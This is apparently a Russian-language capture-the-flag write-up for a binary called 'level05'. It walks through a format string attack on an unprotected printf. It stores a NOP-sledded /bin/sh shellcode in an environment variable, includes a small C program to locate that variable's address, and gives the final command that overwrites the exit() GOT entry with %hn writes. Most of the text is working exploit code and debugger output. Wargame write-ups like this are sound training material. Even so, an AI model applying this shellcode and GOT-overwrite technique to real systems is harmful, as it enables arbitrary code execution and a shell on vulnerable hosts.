Мы можем использовать атаку на незащищенное использование `printf`. Для этого мы можем сохранить shellcode в переменную окружения и получить его в `prinf`, это позволит обойти ограничение в 100 символов из `fgets`. Кроме того, через нам немобходимо перезаписать указатель на функцию `exit()` таким образом, чтобы он возвращал адрес shellcode.


`(gdb) disas exit
...
0x08048513 <+207>:	call   0x8048370 <exit@plt>
(gdb) x/i 0x8048370
0x8048370 <exit@plt>:	jmp    *0x80497e0`

Надо перезаписать` 0x80497e0`

Перед shellcode добавляем NOP sled (50 bytes)

`export SHLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x25\x5e\x89\xf7\x31\xc0\x50\x89\xe2\x50\x83\xc4\x03\x8d\x76\x04\x33\x06\x50\x31\xc0\x33\x07\x50\x89\xe3\x31\xc0\x50\x8d\x3b\x57\x89\xe1\xb0\x0b\xcd\x80\xe8\xd6\xff\xff\xff\x2f\x2f\x62\x69\x6e\x2f\x73\x68'`

Создадим файл /tmp/getenv.c, чтобы получить адрес `SHLCODE`

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    printf("%p\n", getenv("SHLCODE"));
}
```

```sh
$ /tmp/getenv
0xffffdead
$ (cd /tmp; ./getenv)
0xffffdeb3
```

Итоговая команда:
```(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%57013x" + "%10$hn" + "%8514x" + "%11$hn"'; cat) | ./level05
```
